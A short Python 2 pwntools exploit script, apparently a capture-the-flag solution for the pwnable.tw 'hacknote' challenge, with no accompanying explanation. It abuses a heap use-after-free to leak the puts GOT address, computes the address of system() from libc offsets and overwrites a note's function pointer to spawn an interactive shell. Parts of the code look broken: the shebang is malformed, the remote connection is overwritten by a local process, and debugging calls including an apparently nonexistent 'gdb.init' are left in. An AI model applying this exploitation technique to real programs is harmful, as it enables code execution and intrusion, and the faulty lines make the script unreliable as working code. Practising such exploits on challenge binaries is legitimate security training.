#/usr/local/bin python2
#coding:utf-8
from pwn import *
con=remote("chall.pwnable.tw", 10102)
con=process("./hacknote")
e=ELF("./hacknote")
elib=ELF("./hacknote_libc_32.so.6")
puts_got=e.got["puts"]#0x804a024
printn=0x804862b

def addNote(size,content):
    con.recvuntil("choice :")
    con.sendline("1")
    con.recvuntil("size :")
    con.sendline(str(size))
    con.recvuntil("Content :")
    con.sendline(content)
def deleteNote(index):

    con.recvuntil("choice :")

    con.sendline("2")

    con.recvuntil("Index :")

    con.sendline(str(index))

def printNote(index):

    con.recvuntil("choice :")

    con.sendline("3")

    con.recvuntil("Index :")

    con.sendline(str(index))



addNote(24,24*"a")

gdb.attach(con)

addNote(24,24*"a")

gdb.attach(con)

deleteNote(0)

gdb.init(con)

deleteNote(1)

addNote(8,p32(printn)+p32(puts_got))

gdb.attach(con)

printNote(0)

p=con.recv()

puts_addr=u32(p[:4])

d_value=elib.symbols["puts"]-elib.symbols["system"]

sys_addr=puts_addr-d_value

deleteNote(2)

addNote(8,flat([sys_addr,"||sh"]))

printNote(0)

con.interactive()
